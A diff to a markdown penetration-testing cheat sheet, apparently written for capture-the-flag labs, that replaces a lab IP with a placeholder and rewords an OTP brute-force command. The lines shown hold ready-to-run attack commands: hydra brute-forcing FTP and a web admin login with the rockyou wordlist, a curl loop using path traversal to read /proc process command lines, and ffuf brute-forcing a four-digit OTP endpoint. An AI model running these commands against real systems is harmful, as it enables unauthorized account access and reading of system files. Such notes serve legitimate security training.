@@ -115,7 +115,7 @@ hydra -l $user -P list.txt $ip ftp
 ```
 
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.118.60 http-post-form "/admin/:user=admin&pass=^PASS^:Username or password invalid"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <URL> http-post-form "/admin/:user=admin&pass=^PASS^:Username or password invalid"
 ```
 
 #### Bruteforce pop3 creds
@@ -157,8 +157,9 @@ for i in $(seq 900 1000); do curl $IP:<port>/?page=../../../../proc/$i/cmdline -
 
 ### Bruteforce OTP code
 ```bash
-ffuf -c -u '<http://<ip>:<port>/otp-auth>' -H 'Content-Type: application/json' -X POST -d '{"otp":"FUZZ"}' -fr '{"success": "false"}' -w digits -od otp_out where digits was a file with all 4-digit pins and otp_out was an empty dir
+ffuf -c -u '<http://<ip>:<port>/otp-auth>' -H 'Content-Type: application/json' -X POST -d '{"otp":"FUZZ"}' -fr '{"success": "false"}' -w digits.txt -od output
 ```
+where digits.txt is a file with all 4-digit pins and output is an empty dir
 
 ---
 
